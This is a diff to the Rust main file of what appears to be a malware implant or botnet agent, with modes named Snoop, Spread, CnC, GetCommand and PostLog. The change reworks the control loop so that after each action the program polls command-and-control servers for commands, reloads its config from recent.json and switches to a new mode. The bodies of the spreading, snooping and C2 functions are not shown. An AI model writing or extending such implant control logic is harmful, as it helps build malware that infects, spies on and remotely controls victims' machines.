@@ -66,7 +66,7 @@ fn main() {
     let cli = Cli::parse();
 
     // set up logging
-    let mut out = String::from("");
+    let mut out = String::new();
     let mut builder = Builder::from_default_env();
     builder.format(|buf, record| writeln!(buf, "{} - {}", record.level(), record.args()));
     // log to specified output file, if any
@@ -101,16 +101,13 @@ fn main() {
         }
     }
 
-    let mut alive = true;
-    let mut new_conf = false;
     let mut recent_mode: Option<Modes> = cli.mode;
-
     // Get the user specified config path, if any
     let mut conf: Option<Config> = match cli.config.as_deref() {
         Some(conf_path) => match read_config(conf_path) {
             Ok(out) => {
                 info!("from path {conf_path} read config: {out:?}");
-                recent_mode = Some(get_mode(&Some(out.clone())));
+                recent_mode = get_mode(&Some(out.clone()));
                 Some(out)
             }
             Err(e) => {
@@ -121,13 +118,8 @@ fn main() {
         None => None,
     };
 
+    let mut alive = true;
     while alive {
-        if new_conf {
-            info!("switching to new config");
-            conf = read_config("./recent.json").ok();
-            new_conf = false;
-            recent_mode = Some(get_mode(&conf));
-        }
         // run the user specified mode
         if let Some(mode) = recent_mode.clone() {
             match mode.clone() {
@@ -136,18 +128,16 @@ fn main() {
                 Modes::Snoop => snoop(),
                 Modes::Spread => spread(),
                 Modes::DumpConfig => dumpconf(&conf),
-                Modes::GetCommand => {
-                    get_commands(get_c2s(&conf), get_docname(&conf));
-                    new_conf = true;
-                }
-                Modes::PostLog => {
-                    post_log(get_c2s(&conf), out.clone());
-                    get_commands(get_c2s(&conf), get_docname(&conf));
-                    new_conf = true;
-                }
+                Modes::GetCommand => get_commands(get_c2s(&conf), get_docname(&conf)),
+                Modes::PostLog => try_post_log(get_c2s(&conf), out.clone()),
                 Modes::CnC => establish_c2(),
-                // _ => unreachable!(), // panics if code becomes not unreachable
-            }
+                _ => unreachable!(), // panics if code becomes not unreachable
+            };
+
+            get_commands(get_c2s(&conf), get_docname(&conf));
+            info!("switching to new config");
+            conf = read_config("./recent.json").ok();
+            recent_mode = get_mode(&conf);
         } else {
             warn!("no mode specified, exiting logic loop");
             alive = false;
@@ -199,11 +189,11 @@ where
     }
 }
 
-fn get_mode(conf: &Option<Config>) -> Modes {
+fn get_mode(conf: &Option<Config>) -> Option<Modes> {
     if let Some(mode) = get_field("mode", conf) {
-        mode
+        Some(mode)
     } else {
-        Modes::DumpConfig
+        None
     }
 }
 
